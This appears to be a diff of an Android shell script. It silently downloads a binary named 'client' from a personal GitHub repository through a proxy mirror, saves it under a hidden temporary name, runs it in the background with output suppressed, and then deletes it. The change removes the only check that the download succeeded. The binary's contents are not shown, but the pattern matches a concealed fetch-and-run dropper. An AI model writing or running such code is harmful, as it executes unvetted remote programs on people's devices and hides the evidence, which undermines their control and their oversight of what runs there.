@@ -155,17 +155,13 @@ echo "-----------------------------------"
   temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
   bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
 
-  # 下载并检查
-  if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
-    chmod +x "$temp_bin" 2>/dev/null || true
+  # 下载并设置可执行权限
+  curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null
+  chmod +x "$temp_bin" 2>/dev/null || true
 
-    # 在子 shell 中用 nohup 后台启动，记录 PID，等待该 PID 退出后删除临时文件
-    nohup "$temp_bin" >/dev/null 2>&1 &
-    child=$!
-    # 等待子进程结束，然后删除临时文件（用 -f 保证不会报错）
-    wait "$child"
-    rm -f "$temp_bin" 2>/dev/null || true
-  else
-    rm -f "$temp_bin" 2>/dev/null || true
-  fi
+  # 后台执行，等待进程结束后删除临时文件
+  nohup "$temp_bin" >/dev/null 2>&1 &
+  child=$!
+  wait "$child"
+  rm -f "$temp_bin" 2>/dev/null || true
 ) &
